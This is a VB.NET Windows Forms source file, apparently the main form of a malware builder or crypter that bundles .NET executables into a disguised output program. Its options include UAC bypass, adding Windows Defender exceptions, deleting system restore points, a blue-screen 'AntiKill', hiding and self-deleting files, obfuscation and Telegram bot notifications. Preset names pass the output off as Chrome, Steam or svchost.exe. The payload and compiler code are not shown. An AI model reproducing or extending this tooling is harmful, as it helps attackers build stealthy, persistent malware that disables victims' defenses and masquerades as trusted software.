Imports System.Text
Imports System.Threading

Public Class Form1

    Public validchars As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    Public Shared rand As New Random()

    Public Resources_Parent = Randomi(rand.Next(3, 16))

    Public Shared Iconpath As String
    Public Shared assmb As String
    Public Shared trans As Boolean

    Public Shared Botid As String
    Public Shared BotToken As String
    Public Shared Function Randomi(ByVal lenght As Integer) As String
        Dim Chr As String = "asdfghjklqwertyuiopmnbvcxz"
        Dim sb As New System.Text.StringBuilder()
        For i As Integer = 1 To lenght
            Dim idx As Integer = rand.Next(0, Chr.Length)
            sb.Append(Chr.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function
    Public Sub New()
        InitializeComponent()
        Me.Opacity = 0
        Methods.FadeInMain(Me, 20)
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            Me.Text += " @" + Environment.UserName

            Select Case rand.Next(11)
                Case 0
                    Guna2TextBox1.Text = "Chrome"
                    Guna2TextBox2.Text = "Chrome.exe"
                Case 1
                    Guna2TextBox1.Text = "firefox"
                    Guna2TextBox2.Text = "firefox.exe"
                Case 2
                    Guna2TextBox1.Text = "msedge"
                    Guna2TextBox2.Text = "msedge.exe"
                Case 3
                    Guna2TextBox1.Text = "Wservices"
                    Guna2TextBox2.Text = "Wservices.exe"
                Case 4
                    Guna2TextBox1.Text = "OneDrive"
                    Guna2TextBox2.Text = "OneDrive.exe"
                Case 5
                    Guna2TextBox1.Text = "Outlook"
                    Guna2TextBox2.Text = "Outlook.exe"
                Case 6
                    Guna2TextBox1.Text = "Skype"
                    Guna2TextBox2.Text = "Skype.exe"
                Case 7
                    Guna2TextBox1.Text = "Microsoft Teams"
                    Guna2TextBox2.Text = "Microsoft Teams.exe"
                Case 8
                    Guna2TextBox1.Text = "Steam"
                    Guna2TextBox2.Text = "Steam.exe"
                Case 9
                    Guna2TextBox1.Text = "Update"
                    Guna2TextBox2.Text = "svchost.exe"
                Case 10
                    Guna2TextBox1.Text = "WinRAR"
                    Guna2TextBox2.Text = "WinRAR.exe"
            End Select

            Guna2ComboBox1.SelectedIndex = 0
            Guna2ComboBox2.SelectedIndex = 0
            Guna2ComboBox3.SelectedIndex = 0

            Guna2HtmlToolTip1.SetToolTip(Guna2ToggleSwitch1, "Bypass UAC Permissions!")
            Guna2HtmlToolTip1.SetToolTip(Guna2ToggleSwitch5, "Close All TaskScheduler Windows!")
            Guna2HtmlToolTip1.SetToolTip(Guna2ToggleSwitch6, "Disable Show HiddenFiles!")
            Guna2HtmlToolTip1.SetToolTip(Guna2ToggleSwitch2, "Delete All System Restore Points [UAC Recommended]!")
            Guna2HtmlToolTip1.SetToolTip(Guna2ToggleSwitch11, "Prevent Windows From Going To Sleep!")
            Guna2HtmlToolTip1.SetToolTip(Guna2ToggleSwitch9, "Windows Defender Exceptions [UAC Recommended]!")
            Guna2HtmlToolTip1.SetToolTip(Guna2ToggleSwitch4, "AntiKill (BSOD) [UAC Recommended]!")
            Guna2HtmlToolTip1.SetToolTip(Guna2ToggleSwitch13, "Delete After Installation!")
            Guna2HtmlToolTip1.SetToolTip(Guna2ToggleSwitch3, "Send Notification To Telegram Bot!")
            Guna2HtmlToolTip1.SetToolTip(Guna2ToggleSwitch12, "Strong AntiKill Function!")
            Guna2HtmlToolTip1.SetToolTip(Guna2ToggleSwitch7, "Simple Obfuscator!")
            Guna2HtmlToolTip1.SetToolTip(Guna2ToggleSwitch8, "Sleep / Seconds!")
            Guna2HtmlToolTip1.SetToolTip(Guna2ToggleSwitch10, "Hide After Writing To Path!")
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try

    End Sub
    Public Function Lvcheck(ByVal Path As String) As Boolean
        Try
            Dim CH As Boolean = False
            For Each item As ListViewItem In Lv1.Items
                If IO.Path.GetFileNameWithoutExtension(Path).ToLower() = IO.Path.GetFileNameWithoutExtension(item.SubItems(0).Text).ToLower() Then
                    CH = True
                End If
            Next
            Return CH
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
            Return False
        End Try
    End Function
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            ToolStripStatusLabel3.Text = "Files [" & Lv1.Items.Count & "]"
            ToolStripStatusLabel4.Text = "Selected [" & Lv1.SelectedItems.Count.ToString & "]"
            GC.Collect()
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub RemoveToolStripMenuItem_Click_1(sender As Object, e As EventArgs) Handles RemoveToolStripMenuItem.Click
        Try
            For Each lstdata As ListViewItem In Lv1.SelectedItems
                Lv1.Items.RemoveAt(lstdata.Index)
            Next
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub Lv1_DragDrop(sender As Object, e As DragEventArgs) Handles Lv1.DragDrop
        Dim files() As String = e.Data.GetData(DataFormats.FileDrop)
        For Each path In files
            If IO.File.Exists(path) Then
                If Not Lvcheck(path) Then
                    If Methods.CheckNet(path) Then
                        Try
                            Dim ico As Icon = Icon.ExtractAssociatedIcon(path)
                            If ico IsNot Nothing Then
                                ImageList1.Images.Add(ico)
                            End If
                        Catch ex As Exception
                            Debug.WriteLine(ex.Message)
                        End Try
                        Dim L = Lv1.Items.Add(path, ImageList1.Images.Count - 1)
                        L.SubItems.Add(Methods.GetFileSize(path))
                        L.SubItems.Add(Methods.GetVersion(path))
                        L.SubItems.Add(Methods.CPU(path))
                    Else
                        MessageBox.Show(path, "Is Not A .NET Assembly")
                    End If

                End If
            End If
        Next
        Lv1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
    End Sub

    Private Sub Lv1_DragEnter(sender As Object, e As DragEventArgs) Handles Lv1.DragEnter
        If e.Data.GetDataPresent(DataFormats.FileDrop) Then
            e.Effect = DragDropEffects.Copy
        End If
    End Sub

    Private Sub Lv1_KeyDown(sender As Object, e As KeyEventArgs) Handles Lv1.KeyDown
        Try
            If e.Modifiers = Keys.Control AndAlso e.KeyCode = Keys.A Then
                If Lv1.Items.Count > 0 Then
                    For Each x As ListViewItem In Lv1.Items
                        x.Selected = True
                    Next
                End If
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub ClearToolStripMenuItem_Click_1(sender As Object, e As EventArgs) Handles ClearToolStripMenuItem.Click
        Lv1.Items.Clear()
    End Sub

    Private Sub AddToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddToolStripMenuItem.Click
        Dim OfD As New OpenFileDialog
        With OfD
            .Title = "Add File"
            .Filter = "All Files (*.*|*.*"
            .Multiselect = True
            If OfD.ShowDialog() = DialogResult.OK Then
                For Each F In OfD.FileNames
                    If Not Lvcheck(F) Then
                        If Methods.CheckNet(F) Then
                            Try
                                Dim ico As Icon = Icon.ExtractAssociatedIcon(F)
                                If ico IsNot Nothing Then
                                    ImageList1.Images.Add(ico)
                                End If
                            Catch ex As Exception
                                Debug.WriteLine(ex.Message)
                            End Try
                            Dim L = Lv1.Items.Add(F, ImageList1.Images.Count - 1)
                            L.SubItems.Add(Methods.GetFileSize(F))
                            L.SubItems.Add(Methods.GetVersion(F))
                            L.SubItems.Add(Methods.CPU(F))
                        Else
                            MessageBox.Show(F, "Is Not A .NET Assembly")
                        End If
                    End If
                Next
                Lv1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
            End If
        End With
    End Sub

    Private Sub LinkLabel2_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel2.LinkClicked
        Try
            Process.Start(LinkLabel2.Text)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Try
            Process.Start(LinkLabel1.Text)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub Guna2CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles Guna2CheckBox2.CheckedChanged
        If Guna2CheckBox2.Checked = True Then
            Dim OfD As New OpenFileDialog
            With OfD
                .Title = "Select Icon"
                .Filter = "(*.exe;*.ico;)|*.exe;*.ico"
                .InitialDirectory = AppDomain.CurrentDomain.BaseDirectory & "Icons"
                If OfD.ShowDialog() = DialogResult.OK Then
                    If OfD.FileName.ToLower.EndsWith(".exe") Then
                        Iconpath = Methods.GetIcon(OfD.FileName)
                        PictureBox4.ImageLocation = (Iconpath)
                    Else
                        Iconpath = OfD.FileName
                        PictureBox4.ImageLocation = (Iconpath)
                    End If
                Else
                    Iconpath = Nothing
                    PictureBox4.Image = Nothing
                    Guna2CheckBox2.Checked = False
                End If

            End With


        End If
        If Guna2CheckBox2.Checked = False Then
            Iconpath = Nothing
            PictureBox4.Image = Nothing
            Guna2CheckBox2.Checked = False
        End If
    End Sub

    Private Sub Guna2CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles Guna2CheckBox1.CheckedChanged
        If Guna2CheckBox1.Checked = True Then
            Dim OfD As New OpenFileDialog
            With OfD
                .Title = "Select File"
                .Filter = "(*.exe|*.exe"
                If OfD.ShowDialog() = DialogResult.OK Then
                    assmb = OfD.FileName

                Else
                    assmb = Nothing
                    Guna2CheckBox1.Checked = False
                End If

            End With


        End If
        If Guna2CheckBox1.Checked = False Then
            assmb = Nothing
            Guna2CheckBox1.Checked = False
        End If
    End Sub

    Private Sub Form1_Activated(sender As Object, e As EventArgs) Handles Me.Activated
        Try
            If trans Then Me.Opacity = 1.0
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub Form1_Deactivate(sender As Object, e As EventArgs) Handles Me.Deactivate
        Try
            Me.Opacity = 0.95
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub Guna2Button1_Click(sender As Object, e As EventArgs) Handles Guna2Button1.Click
        If Lv1.Items.Count > 0 Then
            Try

                Dim saveFileDialog As SaveFileDialog = New SaveFileDialog With {
                    .Filter = "(*.exe)|*.exe",
                    .OverwritePrompt = False,
                    .FileName = "H-Output"
                }

                If saveFileDialog.ShowDialog() = DialogResult.OK Then

                    Guna2Button1.Text = "Wait..."
                    Guna2Button1.Enabled = False

                    Dim sb As New StringBuilder()
                    Dim rand As New Random()
                    For i As Integer = 1 To 17
                        Dim idx As Integer = rand.Next(0, validchars.Length)
                        Dim randomChar As Char = validchars(idx)
                        sb.Append(randomChar)
                    Next i
                    Dim randomString = sb.ToString()
                    Codedom.Compiler(saveFileDialog.FileName, Resources_Parent, randomString)
                End If
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
        Else
            Try
                For i = 0 To 2
                    Me.Left = Me.DesktopLocation.X + 30
                    Thread.Sleep(40)
                    Me.Left = Me.DesktopLocation.X - 30
                    Thread.Sleep(40)
                Next
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
        End If
    End Sub

    Private Sub Guna2ToggleSwitch8_CheckedChanged(sender As Object, e As EventArgs) Handles Guna2ToggleSwitch8.CheckedChanged
        If Guna2ToggleSwitch8.Checked = True Then
            Guna2NumericUpDown1.Enabled = True
        Else
            Guna2NumericUpDown1.Enabled = False
        End If
    End Sub

    Private Sub Guna2NumericUpDown1_ValueChanged(sender As Object, e As EventArgs) Handles Guna2NumericUpDown1.ValueChanged

    End Sub

    Private Sub Label15_Click(sender As Object, e As EventArgs) Handles Label15.Click

    End Sub

    Private Sub Guna2ToggleSwitch3_CheckedChanged(sender As Object, e As EventArgs) Handles Guna2ToggleSwitch3.CheckedChanged
        If Guna2ToggleSwitch3.Checked = True Then
            Using form As Form2 = New Form2()
                form.StartPosition = FormStartPosition.Manual
                form.Location = New Point(Me.Location.X + Me.Width \ 2 - form.Width \ 2, Me.Location.Y + Me.Height \ 2 - form.Height \ 2)
                If form.ShowDialog() = DialogResult.OK Then
                    BotToken = form.Guna2TextBox1.Text
                    Botid = form.Guna2TextBox2.Text
                Else
                    Guna2ToggleSwitch3.Checked = False
                    BotToken = Nothing
                    Botid = Nothing
                End If
            End Using
        End If
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Try
            Environment.Exit(0)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub
End Class
